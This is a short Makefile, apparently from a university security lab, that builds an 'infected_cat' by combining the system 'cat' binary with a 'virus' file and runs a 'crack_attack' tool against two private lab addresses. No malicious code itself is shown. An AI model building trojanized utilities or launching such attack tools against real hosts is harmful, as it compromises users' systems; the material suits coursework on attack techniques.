all: infected_cat
	chmod +x attack_server
	chmod +x crack_attack

infected_cat: cat virus
#-k: no delete original file
	xz -k -f cat
	touch infected_cat
	chmod +x infected_cat

copy_picture:
	cp /home/csc2023/simple_pic.jpg /home/csc2023/Pictures/simple_pic.jpg

run:
	./crack_attack 192.168.56.101 192.168.56.102 7000

clean:
	rm infected_cat
	rm cat.xz
